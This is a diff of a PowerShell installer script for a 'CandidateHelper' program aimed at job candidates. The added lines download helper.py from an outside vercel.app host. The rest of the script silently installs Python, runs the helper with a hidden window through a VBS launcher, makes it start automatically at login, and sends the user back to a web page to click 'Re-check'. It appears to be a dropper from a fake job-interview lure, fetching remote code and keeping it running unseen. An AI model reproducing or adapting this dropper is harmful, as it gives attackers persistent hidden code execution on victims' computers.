@@ -1,4 +1,5 @@
 $ErrorActionPreference = 'Stop'
+$Base = 'https://candidate-video-suite.vercel.app'
 
 function Refresh-Path {
     $env:Path = [Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [Environment]::GetEnvironmentVariable('Path', 'User')
@@ -10,11 +11,14 @@ Write-Host '========================================'
 
 $dir = Join-Path $env:LOCALAPPDATA 'CandidateHelper'
 New-Item -ItemType Directory -Force $dir | Out-Null
-Copy-Item (Join-Path $PSScriptRoot 'helper.py') (Join-Path $dir 'helper.py') -Force
+$helper = Join-Path $dir 'helper.py'
+
+Write-Host '[+] Downloading helper...'
+Invoke-WebRequest -UseBasicParsing "$Base/helper.py" -OutFile $helper
 
 Refresh-Path
 if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
-    Write-Host '[-] Installing Python 3.12 via winget...'
+    Write-Host '[-] Installing Python 3.12 via winget (a few minutes)...'
     winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
     Refresh-Path
 }
@@ -32,7 +36,6 @@ Write-Host '[+] Installing Python libraries...'
 & python -m pip install fastapi uvicorn requests
 
 $vbs = Join-Path $dir 'launcher.vbs'
-$helper = Join-Path $dir 'helper.py'
 $line = 'CreateObject("WScript.Shell").Run """' + $pyw + '"" ""' + $helper + '""", 0, False'
 Set-Content -Path $vbs -Value $line -Encoding ASCII
 $cmd = 'wscript.exe "' + $vbs + '"'
@@ -51,4 +54,4 @@ Start-Process wscript.exe -ArgumentList ('"' + $vbs + '"')
 
 Write-Host ''
 Write-Host '[+] Done. The helper now starts automatically at login.'
-Write-Host '[+] Go back to the web page and click Retry.'
+Write-Host '[+] Go back to the web page and click Re-check.'
